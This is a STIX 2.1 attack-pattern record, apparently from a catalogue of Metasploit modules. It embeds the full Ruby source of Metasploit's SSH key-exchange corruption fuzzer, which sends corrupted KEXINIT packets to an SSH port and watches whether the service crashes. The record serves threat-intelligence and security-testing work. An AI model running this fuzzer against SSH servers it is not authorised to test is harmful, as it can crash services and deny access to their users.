{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2ffa21c-6267-4fcf-ac10-301f91eba7a9",
    "created": "2024-08-14T16:26:30.968764Z",
    "modified": "2024-08-14T16:26:30.968767Z",
    "name": "SSH Key Exchange Init Corruption",
    "description": " This module sends a series of SSH requests with a corrupted initial key exchange payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/ssh/ssh_kexinit_corrupt.rb",
            "external_id": "ssh_kexinit_corrupt.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Fuzzer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SSH Key Exchange Init Corruption',\n      'Description'    => %q{\n        This module sends a series of SSH requests with a corrupted initial key exchange payload.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE\n    ))\n    register_options([\n      Opt::RPORT(22),\n      OptInt.new('MAXDEPTH', [false, 'Specify a maximum byte depth to test'])\n    ])\n  end\n\n  def do_ssh_kexinit(pkt,opts={})\n    @connected = false\n    connect\n    @connected = true\n\n    @banner = sock.get_once(-1,opts[:banner_timeout])\n    return if not @banner\n\n    sock.put(\"SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1\\r\\n\")\n    sock.put(pkt)\n    sock.get_once(-1,opts[:kex_timeout])\n  end\n\n  def run\n    last_str = nil\n    last_inp = nil\n    last_err = nil\n\n    pkt = make_kex_init\n    cnt = 0\n\n    max = datastore['MAXDEPTH'].to_i\n    max = nil if max == 0\n    tot = ( max ? [max,pkt.length].min : pkt.length) * 256\n\n    print_status(\"Fuzzing SSH initial key exchange with #{tot} requests\")\n    fuzz_string_corrupt_byte_reverse(pkt,max) do |str|\n      cnt += 1\n\n      if(cnt % 100 == 0)\n        print_status(\"Fuzzing with iteration #{cnt}/#{tot} using #{@last_fuzzer_input}\")\n      end\n\n      begin\n        r = do_ssh_kexinit(str,:banner_timeout => 5, :kex_timeout => 0.5)\n      rescue ::Interrupt\n        print_status(\"Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}\")\n        raise $!\n      rescue ::Exception => e\n        last_err = e\n      ensure\n        disconnect\n      end\n\n      if(not @connected)\n        if(last_str)\n          print_status(\"The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack(\"H*\")[0]} error=#{last_err}\")\n        else\n          print_status(\"Could not connect to the service: #{last_err}\")\n        end\n        return\n      end\n\n      if(not @banner)\n        print_status(\"The service may have crashed (no banner): iteration:#{cnt-1} method=#{last_inp} string=#{last_str.to_s.unpack(\"H*\")[0]} \")\n        return\n      end\n\n      last_str = str\n      last_inp = @last_fuzzer_input\n    end\n  end\n\n  def make_kex_init\n    [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,\n    0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,\n    0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,\n    0x00, 0x7e, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,\n    0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,\n    0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65,\n    0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,\n    0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x2c, 0x64,\n    0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65,\n    0x6c, 0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72,\n    0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68,\n    0x61, 0x6e, 0x67, 0x65, 0x2d, 0x73, 0x68, 0x61,\n    0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,\n    0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,\n    0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x34,\n    0x2d, 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69,\n    0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c,\n    0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f,\n    0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31,\n    0x00, 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d,\n    0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d,\n    0x64, 0x73, 0x73, 0x00, 0x00, 0x00, 0x9d, 0x61,\n    0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63, 0x62,\n    0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d, 0x63,\n    0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77, 0x66,\n    0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63, 0x2c,\n    0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38, 0x2d,\n    0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63, 0x66,\n    0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c, 0x61,\n    0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32, 0x35,\n    0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f, 0x75,\n    0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39, 0x32,\n    0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65, 0x73,\n    0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63, 0x2c,\n    0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65, 0x6c,\n    0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79, 0x73,\n    0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69, 0x75,\n    0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73, 0x31,\n    0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c, 0x61,\n    0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63, 0x74,\n    0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35, 0x36,\n    0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00, 0x9d,\n    0x61, 0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63,\n    0x62, 0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d,\n    0x63, 0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77,\n    0x66, 0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63,\n    0x2c, 0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38,\n    0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63,\n    0x66, 0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c,\n    0x61, 0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32,\n    0x35, 0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f,\n    0x75, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39,\n    0x32, 0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65,\n    0x73, 0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63,\n    0x2c, 0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65,\n    0x6c, 0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79,\n    0x73, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69,\n    0x75, 0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73,\n    0x31, 0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c,\n    0x61, 0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63,\n    0x74, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35,\n    0x36, 0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00,\n    0x69, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64,\n    0x35, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,\n    0x68, 0x61, 0x31, 0x2c, 0x75, 0x6d, 0x61, 0x63,\n    0x2d, 0x36, 0x34, 0x40, 0x6f, 0x70, 0x65, 0x6e,\n    0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c,\n    0x68, 0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70,\n    0x65, 0x6d, 0x64, 0x31, 0x36, 0x30, 0x2c, 0x68,\n    0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70, 0x65,\n    0x6d, 0x64, 0x31, 0x36, 0x30, 0x40, 0x6f, 0x70,\n    0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,\n    0x6d, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,\n    0x68, 0x61, 0x31, 0x2d, 0x39, 0x36, 0x2c, 0x68,\n    0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2d,\n    0x39, 0x36, 0x00, 0x00, 0x00, 0x69, 0x68, 0x6d,\n    0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2c, 0x68,\n    0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,\n    0x2c, 0x75, 0x6d, 0x61, 0x63, 0x2d, 0x36, 0x34,\n    0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68,\n    0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68, 0x6d, 0x61,\n    0x63, 0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64,\n    0x31, 0x36, 0x30, 0x2c, 0x68, 0x6d, 0x61, 0x63,\n    0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64, 0x31,\n    0x36, 0x30, 0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73,\n    0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68,\n    0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,\n    0x2d, 0x39, 0x36, 0x2c, 0x68, 0x6d, 0x61, 0x63,\n    0x2d, 0x6d, 0x64, 0x35, 0x2d, 0x39, 0x36, 0x00,\n    0x00, 0x00, 0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40,\n    0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e,\n    0x63, 0x6f, 0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62,\n    0x2c, 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00,\n    0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40, 0x6f, 0x70,\n    0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,\n    0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62, 0x2c, 0x6e,\n    0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00].pack(\"C*\")\n  end\nend\n"
}